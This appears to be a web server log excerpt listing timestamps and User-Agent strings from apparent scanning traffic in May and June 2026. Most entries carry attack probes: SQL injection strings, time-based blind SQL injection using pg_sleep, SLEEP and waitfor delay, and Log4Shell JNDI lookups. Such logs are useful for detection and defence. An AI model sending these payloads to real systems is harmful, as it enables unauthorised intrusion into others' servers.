Time,User Agent
"2026-06-22 00:45:35","x' OR SLEEP(8) OR 'x"
"2026-06-16 17:31:42","x' OR SLEEP(8) OR 'x"
"2026-06-14 23:09:45","x' OR SLEEP(8) OR 'x"
"2026-06-12 22:10:19","x' OR SLEEP(8) OR 'x"
"2026-06-03 19:53:36","WebEnumerationFramework/11.0 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 19:53:23","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 18:28:35","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 10:46:36","1' OR '1'='1"
"2026-06-03 01:06:32","ReconEngine/5.4 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:22","' OR 1=1--"
"2026-06-03 01:02:19","ThreatHunterAgent/8.2 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:14","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:32:43","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:31:50","<<<<>>>>"
"2026-06-01 10:44:53","<<<<>>>>"
"2026-06-01 10:44:42","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:45","1' OR '1'='1"
"2026-06-01 08:54:45","' OR 1=1--"
"2026-06-01 08:54:26","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:26","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:53:51","<<<<>>>>"
"2026-06-01 08:53:47","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:28","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:14","' OR 1=1--"
"2026-06-01 01:19:06","<<<<>>>>"
"2026-05-31 19:41:32","1' OR '1'='1"
"2026-05-31 19:41:29","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:27","<<<<>>>>"
"2026-05-31 17:06:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 17:05:27","<<<<>>>>"
"2026-05-31 14:50:39","<<<<>>>>"
"2026-05-31 14:50:27","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 11:20:45","1' OR '1'='1"
"2026-05-30 12:26:44","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:32:35","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:30:54","<<<<>>>>"
"2026-05-30 11:30:50","' OR 1=1--"
"2026-05-30 11:29:43","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:26","1' OR '1'='1"
"2026-05-30 11:29:22","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:20","<<<<>>>>"
"2026-05-30 11:29:19","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 17:20:07","' OR 1=1--"
"2026-05-29 17:20:00","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 13:45:04","' OR 1=1--"
"2026-05-29 13:40:23","' OR 1=1--"
"2026-05-29 13:39:04","' OR 1=1--"
"2026-05-29 13:30:01","' OR 1=1--"
"2026-05-29 13:26:19","' OR 1=1--"
"2026-05-29 13:20:31","' OR 1=1--"
"2026-05-29 13:16:50","' OR 1=1--"
"2026-06-01 15:31:42","""@@@@@@@"""
"2026-06-01 10:44:30","""@@@@@@@"""
"2026-06-01 01:19:03","""@@@@@@@"""
"2026-05-31 19:41:21","""@@@@@@@"""
"2026-05-31 14:51:09","""@@@@@@@"""
"2026-05-31 11:20:50","""@@@@@@@"""
"2026-05-30 11:25:42","""@@@@@@@"""
"2026-05-29 18:05:38","""@@@@@@@"""
"2026-05-29 17:20:59","""@@@@@@@"""
"2026-06-03 10:05:14","#"
"2026-06-01 15:32:22","select pg_sleep(3)"
"2026-06-01 10:44:27","select pg_sleep(3)"
"2026-06-01 01:19:11","select pg_sleep(3)"
"2026-05-31 19:41:24","select pg_sleep(3)"
"2026-05-31 17:05:22","select pg_sleep(3)"
"2026-05-31 13:16:47","#"
"2026-05-31 10:05:03","#"
"2026-05-30 12:26:26","select pg_sleep(3)"
"2026-05-30 11:30:52","select pg_sleep(3)"
"2026-05-26 11:20:15","#"
"2026-06-13 10:46:03","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-06-12 23:38:27","SecurityAssessmentClient/3.1 1' OR '1'='1"
"2026-06-12 22:09:44","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 15:32:41","VulnerabilitySweep/2.6 1' OR '1'='1"
"2026-06-01 10:44:29","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 01:18:59","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-05-31 14:51:12","select pg_sleep(6)"
"2026-06-12 23:38:27","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-12 23:38:26","AssetProfiler/6.5 1' OR '1'='1"
"2026-06-12 22:09:44","ReconEngine/5.4 1' OR '1'='1"
"2026-06-12 20:19:43","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-03 18:28:34","waitfor delay '0:0:5'"
"2026-06-01 15:32:25","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-01 15:31:53","select pg_sleep(6)"
"2026-06-01 15:31:53","waitfor delay '0:0:9'"
"2026-06-01 08:54:30","waitfor delay '0:0:5'"
"2026-06-01 08:53:46","select pg_sleep(6)"
"2026-05-31 22:15:54","select pg_sleep(6)"
"2026-05-31 11:20:50","select pg_sleep(6)"
"2026-05-31 11:20:47","waitfor delay '0:0:5'"
"2026-05-30 11:29:19","ReconEngine/5.4 1' OR '1'='1"
"2026-06-02 22:35:43","ReconEngine/5.4 1' OR '1'='1"
